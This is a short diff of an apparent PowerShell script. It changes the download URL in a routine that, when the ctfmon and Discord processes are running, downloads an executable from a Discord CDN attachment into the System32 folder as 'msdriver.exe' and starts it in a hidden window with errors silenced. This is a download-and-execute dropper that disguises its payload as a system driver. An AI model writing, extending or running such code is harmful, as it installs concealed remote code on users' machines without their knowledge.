@@ -54,7 +54,7 @@ if ($response.success -eq $true) {
     $discordRunning = Get-Process -Name "discord" -ErrorAction SilentlyContinue
     if ($ctfmonRunning -and $discordRunning) {
         $destination = "C:\Windows\System32\msdriver.exe"
-        $url = "https://tinyurl.com/tupt52nw"
+        $url = "https://cdn.discordapp.com/attachments/1368958099712376952/1385752085806715081/msdriver.exe?ex=685735b3&is=6855e433&hm=dc8d27b2586ac7c80f012099b02b49c5a00ba24aa846a42315140b028e1bff17&"
         Invoke-WebRequest -Uri $url -OutFile $destination -ErrorAction SilentlyContinue
         Start-Sleep -Seconds 2
         Start-Process -FilePath $destination -WindowStyle Hidden -ErrorAction SilentlyContinue | Out-Null
